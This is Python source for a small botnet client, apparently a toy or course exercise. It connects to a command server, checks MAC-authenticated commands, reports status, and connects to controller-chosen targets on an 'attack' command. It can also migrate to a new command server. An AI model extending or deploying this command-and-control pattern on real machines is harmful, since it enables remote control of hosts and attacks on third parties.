import socket
import sys
import time
import hashlib

class ncbot:
    def __init__(self, hostname, port, nick, secret):
        self.hostname = hostname
        self.port = int(port)
        self.nick = nick
        self.secret = secret
        self.seen_nonces = set()
        self.command_count = 0
        self.sock = None
        self.connect_to_server()

    def connect_to_server(self):
        while True:
            try:
                self.sock = socket.create_connection((self.hostname, self.port))
                print("Connected to server.")
                self.send_message(f"-joined {self.nick}")
                self.listen_for_commands()
            except (socket.error, ConnectionRefusedError):
                print("Failed to connect. Retrying in 5 seconds...")
                time.sleep(5)

    def send_message(self, message):
        try:
            self.sock.sendall((message + "\n").encode())
        except socket.error:
            print("Error sending message.")

    def listen_for_commands(self):
        while True:
            try:
                data = self.sock.recv(1024).decode().strip()
                if not data:
                    raise ConnectionResetError
                self.handle_command(data)
            except (socket.error, ConnectionResetError):
                print("Disconnected. Reconnecting...")
                self.connect_to_server()
                break

    def handle_command(self, data):
        parts = data.split()
        if len(parts) < 3:
            return  # Invalid command format
        
        nonce, mac, command, *args = parts
        if nonce in self.seen_nonces:
            return  # Ignore reused nonce
        
        expected_mac = hashlib.sha256((nonce + self.secret).encode()).hexdigest()[:8]
        if mac != expected_mac:
            return  # Ignore unauthenticated command
        
        self.seen_nonces.add(nonce)
        self.command_count += 1
        
        if command == "status":
            self.send_message(f"-status {self.nick} {self.command_count}")
        elif command == "shutdown":
            self.send_message(f"-shutdown {self.nick}")
            self.sock.close()
            sys.exit(0)
        elif command == "attack":
            self.execute_attack(args)
        elif command == "move":
            self.move_to_new_server(args)

    def execute_attack(self, args):
        if len(args) != 1:
            return
        target_host, target_port = args[0].split(":")
        try:
            with socket.create_connection((target_host, int(target_port)), timeout=3) as attack_sock:
                attack_sock.sendall(f"{self.nick} {next(iter(self.seen_nonces))}\n".encode())
                self.send_message(f"-attack {self.nick} OK")
        except Exception as e:
            self.send_message(f"-attack {self.nick} {str(e)}")

    def move_to_new_server(self, args):
        if len(args) != 1:
            return
        new_host, new_port = args[0].split(":")
        self.send_message(f"-move {self.nick}")
        self.sock.close()
        self.hostname, self.port = new_host, int(new_port)
        self.connect_to_server()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: ./ncbot.py <hostname>:<port> <nick> <secret>")
        sys.exit(1)
    
    hostname, port = sys.argv[1].split(":")
    nick = sys.argv[2]
    secret = sys.argv[3]
    
    bot = ncbot(hostname, port, nick, secret)
